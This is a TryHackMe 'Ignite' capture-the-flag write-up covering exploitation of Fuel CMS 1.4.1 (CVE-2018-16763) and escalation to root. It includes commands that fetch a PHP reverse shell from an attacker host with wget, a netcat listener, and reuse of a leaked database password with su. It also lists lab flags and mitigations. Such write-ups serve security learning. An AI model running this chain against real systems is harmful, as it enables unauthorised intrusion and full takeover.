```
 ██╗ ██████╗ ███╗   ██╗██╗████████╗███████╗
 ██║██╔════╝ ████╗  ██║██║╚══██╔══╝██╔════╝
 ██║██║  ███╗██╔██╗ ██║██║   ██║   █████╗
 ██║██║   ██║██║╚██╗██║██║   ██║   ██╔══╝
 ██║╚██████╔╝██║ ╚████║██║   ██║   ███████╗
 ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝   ╚═╝   ╚══════╝
            TryHackMe: Ignite
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-22 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐☆☆☆

> ⏱️ ~9 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: single port, HTTP (80), "Welcome to FUEL CMS"
- [x] Feroxbuster: confirmed `/fuel/` admin path, no version banner
- [x] `searchsploit fuel cms` → identified CVE-2018-16763 RCE exploit (EDB-50477)
- [x] Ran the exploit: got an interactive pseudo-shell on the CMS backend
- [x] Used the pseudo-shell to `wget` a PHP reverse shell into the webroot
- [x] Triggered the uploaded shell via a direct HTTP request
- [x] Caught reverse shell as `www-data`
- [x] Found user flag in `/home/www-data/flag.txt`
- [x] Read `application/config/database.php` → found DB root password
- [x] Tried `sudo su` with the DB password: failed (sudo password ≠ DB password)
- [x] `su` directly with the same password: succeeded (root password reuse)
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration
- 🔍 searchsploit: local Exploit-DB search for Fuel CMS exploits
- 🐍 CVE-2018-16763 exploit script (EDB-50477): Fuel CMS RCE
- 🌐 Python HTTP server: serving the reverse shell payload for `wget` retrieval
- 🐚 Netcat: reverse shell listener

---

## ⚡ TL;DR

The homepage announces "Welcome to FUEL CMS" directly in the title: no version fingerprinting needed before pulling Fuel CMS exploits from Exploit-DB. CVE-2018-16763 (an authentication-bypass RCE in Fuel CMS 1.4.1) provided an interactive pseudo-shell through which a proper PHP reverse shell was staged via `wget` and triggered over HTTP. From `www-data`, the CMS's own database config file leaked the MySQL root password in plaintext: which turned out to be reused as the Linux root password too.

---

## 📖 Introduction

Today's target is **Ignite**: a box that names its own vulnerability in the page title, which is either refreshingly honest or a significant operational security failure depending on your perspective. Fuel CMS 1.4.1 carries a well-documented unauthenticated RCE, and once that door opens, the rest of the box leans on a mistake seen constantly in real engagements: a database credential, sitting in plaintext in a configuration file, reused verbatim as the root system password. No clever escalation chain required: just reading a file everyone forgets is sensitive because "it's just a config file."

### Prerequisites

Readers are assumed to know:

- How to use `searchsploit` to find and retrieve local copies of Exploit-DB entries
- What CVE-2018-16763 is at a conceptual level (Fuel CMS authentication bypass to RCE)
- How to stage a payload via `wget` from a pseudo-shell and trigger it over HTTP
- Why credential reuse between a database account and a system account is dangerous

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

```bash
rustscan -a 10.49.166.110 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu): "Welcome to FUEL CMS" |

A single open port. The HTTP title removes any ambiguity about what's running.

### Web Directory Enumeration

```bash
feroxbuster -u http://10.49.166.110/ \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -x php,xt,html
```

```
301  /fuel             # admin panel root
200  /fuel/login       # login form
302  /fuel/dashboard  →  /fuel/login/<token>   # auth-gated, redirects when unauthenticated
```

The `/fuel/` admin structure is fully exposed, confirming the CMS identity. No version number is directly visible on the page, but the title alone is enough to search for known exploits.

---

## 🚪 Foothold

*(~5 mins into the box)*

### CVE-2018-16763: Fuel CMS Unauthenticated RCE

**What is this vulnerability?** Fuel CMS versions up to and including 1.4.1 contain a flaw in how the application evaluates certain input: an attacker can manipulate request parameters such that arbitrary PHP code is evaluated server-side, without any authentication. This was assigned CVE-2018-16763 and has multiple public proof-of-concept exploits.

*Searching local Exploit-DB mirror for Fuel CMS exploits:*

```bash
searchsploit fuel cms
```

```
Fuel CMS 1.4.1 - Remote Code Execution (1)   linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)   php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)   php/webapps/50477.py
```

*Copying the third RCE script locally:*

```bash
searchsploit -m php/webapps/50477.py
```

*Running the exploit against the target:*

```bash
python 50477.py -u http://10.49.166.110
```

```
[+]Connecting...
Enter Command $
```

An interactive pseudo-shell, command-by-command: not a full reverse shell, but enough to stage one.

*Confirming basic command execution:*

```
Enter Command $ls
README.md  assets  composer.json  contributing.md  fuel  index.php  robots.txt

Enter Command $pwd
/var/www/html
```

---

## 🐚 Shell / Access

*(~8 mins into the box)*

### Staging a Proper Reverse Shell

The exploit's pseudo-shell is functional but limited: no interactivity for tools requiring a TTY, no persistence. The standard move: use it to pull down a real PHP reverse shell via `wget`, then trigger that file directly over HTTP.

*Serving the PHP reverse shell from the attacking machine:*

```bash
python3 -m http.server 80
```

*Downloading it via the pseudo-shell:*

```
Enter Command $wget http://192.168.134.217/php-reverse-shell.php
```

The download fired repeatedly (visible as `.1`, `.2`, `.3`... duplicate files in the listing): the exploit script appears to issue the command multiple times internally, which is harmless here since `wget` simply creates incrementing filenames rather than failing.

*Confirming the file landed:*

```
Enter Command $ls
... php-reverse-shell.php  php-reverse-shell.php.1  ... php-reverse-shell.php.12 ...
```

*Setting up the listener, then triggering the original (non-duplicated) file directly:*

```bash
nc -nvlp 4444
```

```
# browser/curl: http://10.49.166.110/php-reverse-shell.php
```

```
connect to [192.168.134.217] from (UNKNOWN) [10.49.166.110] 38770
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

*Stabilising:*

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

*Collecting the user flag:*

```bash
cat /home/www-data/flag.txt
# 6470e394cbf6dab6a91682cc8585059b
```

---

## 📈 Escalation

*(~12 mins into the box)*

### Database Config Credential Reuse

Standard CodeIgniter/Fuel CMS structure places database credentials in a predictable config file:

```bash
cd /var/www/html/fuel/application/config
cat database.php
```

```php
$db['default'] = array(
    'hostname' => 'localhost',
    'username' => 'root',
    'password' => 'mememe',
    'database' => 'fuel_schema',
    ...
);
```

MySQL root password: `mememe`. Worth testing immediately against the Linux accounts: database and system credential reuse is depressingly common.

*First attempt: `sudo su` with the DB password:*

```bash
sudo su
# [sudo] password for www-data: mememe
# Sorry, try again. (x3)
```

`www-data` has no valid `sudo` password matching this: expected, since `www-data` typically has no interactive login credentials at all.

*Second attempt: `su` directly to root:*

```bash
su
# Password: mememe
```

```
root@ubuntu:~# cat root.txt
b9bbcb33e11b80be759c4e844862482d
```

The MySQL root password and the Linux root password are identical.

---

## 💥 Exploitation

The complete attack chain:

1. **Page title** identified Fuel CMS directly; `searchsploit` found CVE-2018-16763
2. **EDB-50477** exploit → pseudo-shell, no authentication required
3. **`wget` from pseudo-shell** → staged a full PHP reverse shell in the webroot
4. **HTTP trigger** → reverse shell as `www-data` → user flag
5. **`application/config/database.php`** → MySQL root password `mememe`
6. **`su` (not `sudo su`)** → password reuse → Linux root → root flag

---

## 🐇 Rabbit Holes

### `sudo su` Before Plain `su`

The first escalation attempt used `sudo su`, which failed three times with the correct-looking password. The distinction matters: `sudo` asks for the *calling user's own* password (here, `www-data`, which has no usable interactive password), while `su` asks for the *target user's* password (`root`'s own password). Since the leaked credential was reused as root's actual login password: not as a sudo grant for `www-data`: only the second form worked. A useful general reminder: when a found password doesn't work with `sudo`, try it with `su` before assuming it's the wrong credential entirely.

### Duplicate File Downloads via the Exploit's wget Command

Running the `wget` command once through the pseudo-shell apparently issued the underlying HTTP request multiple times internally (resulting in `php-reverse-shell.php.1` through `.12`), based on the directory listing immediately afterward. This didn't cause any functional problem: the original un-suffixed file was still valid and triggered the shell correctly, but it's a quirk worth expecting when using this particular exploit script.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `6470e394cbf6dab6a91682cc8585059b` | `/home/www-data/flag.txt` |
| Root | `b9bbcb33e11b80be759c4e844862482d` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Fuel CMS 1.4.1 unauthenticated RCE (CVE-2018-16763) | Critical | Update Fuel CMS to a patched release; subscribe to CMS-specific security advisories |
| CMS identity disclosed directly in page title | Low | Avoid exposing exact CMS name/version in publicly visible page metadata where avoidable |
| Database credentials stored in plaintext config file | High | Use environment variables or a secrets manager for database credentials rather than committing them to a readable PHP config file |
| Database root password reused as system root password | Critical | Never reuse credentials across different privilege boundaries (database vs. OS); use unique, randomly generated passwords for each |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** When a discovered credential fails against `sudo`, try it against `su` before discarding it: the two commands check entirely different passwords (the caller's vs. the target account's), and a credential leaked from an application config file is far more likely to match a direct account password than a `sudo` grant for an unrelated service account.

---

## 🔁 If I Did It Again

Go straight to staging a full reverse shell via the exploit's command execution rather than exploring with the pseudo-shell first: the pseudo-shell's one-command-at-a-time interface is useful for verification but slower than just landing a proper interactive shell immediately.

---

## 🔚 Changelog

*Last updated: 2026-06-22*

---

[↑ Back to top](#)
